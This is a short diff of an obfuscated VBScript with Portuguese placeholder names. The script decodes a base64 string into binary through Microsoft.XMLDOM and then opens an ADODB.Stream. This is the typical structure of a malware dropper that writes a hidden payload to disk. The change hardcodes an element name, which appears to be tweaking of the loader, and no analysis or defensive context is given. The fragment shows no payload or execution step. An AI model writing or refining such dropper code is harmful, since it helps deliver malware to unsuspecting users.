@@ -1,6 +1,6 @@
 Class classe1
     Function funcao1(parametro)
-	    set o = CreateObject("microsoft.xmldom").createElement(parametro(1))
+	    set o = CreateObject("microsoft.xmldom").createElement("ktc")
 	    o.DataType = "bin.base64"
         o.Text = parametro(0)
         funcao1 = Array(o.NodeTypedValue)
@@ -20,7 +20,7 @@ End Class
 Set objClasse1 = New classe1
 variavel1 = objClasse1.getInfo("labito")
 variavel2 = Replace(variavel1(0), variavel1(1), variavel1(2))
-variavel1 = Array(variavel2, "ktc", 0, 0)
+variavel1 = Array(variavel2, 0, 0, 0)
 
 variavel4 = objClasse1.funcao1(variavel1)
 adodb = CreateObject("adodb.stream")
